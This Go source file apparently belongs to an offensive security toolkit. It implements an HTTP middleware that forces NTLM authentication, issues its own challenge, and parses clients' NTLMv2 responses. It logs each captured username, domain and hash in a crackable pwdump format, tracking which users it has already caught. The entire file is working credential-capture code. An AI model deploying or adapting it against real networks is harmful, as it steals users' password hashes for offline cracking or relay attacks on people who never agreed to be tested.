package ntlm

import (
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"net/http"
	"strings"

	"github.com/hophouse/gop/utils"
	"github.com/hophouse/gop/utils/logger"
)

type NTLMAuthMiddleware struct{}

var NtlmCapturedAuth map[string]bool

func (n NTLMAuthMiddleware) ServeHTTP(w http.ResponseWriter, r *http.Request, next http.HandlerFunc) {
	// Get the response header.
	authorization := r.Header.Get("Authorization")

	if authorization == "" {
		w.Header().Set("WWW-Authenticate", "NTLM")
		w.WriteHeader(401)
		return
	}

	// Sometimes even if NTLM auth is required, the server is sending and other header
	if !strings.HasPrefix(authorization, "NTLM") {
		logger.Printf("[NON NTLM HEADER CAPTURED] [%s]: %s\n", utils.GetSourceIP(r), authorization)
		next(w, r)
	}

	// Remove the "NTLM " string at the beginning
	authorization_bytes, err := base64.StdEncoding.DecodeString(authorization[5:])
	if err != nil {
		logger.Printf("Decode error authorization header : %s\n", authorization)
		return
	}

	if len(authorization_bytes) < 40 {
		logger.Printf("Decoded authorization header is less than 40 bytes. Header was : %s\n", authorization)
		return
	}

	if len(authorization_bytes) < 12 {
		logger.Printf("Decoded authorization header is less than 12 bytes. Header was : %s\n", authorization)
		return
	}
	msgType := binary.LittleEndian.Uint32(authorization_bytes[8:12])

	// Received a type 1 and respond with type 2
	if msgType == uint32(1) {
		msg1 := NTLMSSP_NEGOTIATE{}
		msg1.Read(authorization_bytes)
		logger.Printf("[NTLM message type 1] %s\n", msg1.ToString())

		msg2 := NewNTLMSSP_CHALLENGEShort()
		msg2b64 := base64.RawStdEncoding.EncodeToString(msg2.ToBytes())

		header := fmt.Sprintf("NTLM %s", msg2b64)

		w.Header().Set("WWW-Authenticate", header)
		w.WriteHeader(401)

		return
	}

	// Type 3
	if msgType == uint32(3) {
		// Remove the "NTLM "
		_, err := base64.StdEncoding.DecodeString(authorization[5:])
		if err != nil {
			logger.Println("decode error:", err)
			return
		}

		msg3 := NTLMSSP_AUTH{}
		msg3.Read(authorization_bytes)
		logger.Printf("[NTLM-AUTH] [%s] [%s] [%s] ", msg3.TargetName.RawData, msg3.Username.RawData, msg3.Workstation.RawData)
		logger.Printf("[NTLM message type 3]\n%s", msg3.ToString())

		ntlmv2Response := NTLMv2Response{}
		ntlmv2Response.Read(msg3.NTLMv2Response.RawData)
		logger.Printf("%s", ntlmv2Response.ToString())

		ntlmv2_pwdump := fmt.Sprintf("%s::%s:%x:%x:%x\n", string(msg3.Username.RawData), string(msg3.TargetName.RawData), []byte(Challenge), ntlmv2Response.NTProofStr, msg3.NTLMv2Response.RawData[len(ntlmv2Response.NTProofStr):])

		authInformations := fmt.Sprintf("%s:%s", string(msg3.TargetName.RawData), string(msg3.Username.RawData))
		if _, found := NtlmCapturedAuth[authInformations]; !found {
			NtlmCapturedAuth[authInformations] = true
			logger.Printf("[PWDUMP] %s", ntlmv2_pwdump)
		} else {
			logger.Printf("[+] User %s NTLMv2 challenge was already captured.\n", authInformations)
		}
	}

	next(w, r)
}
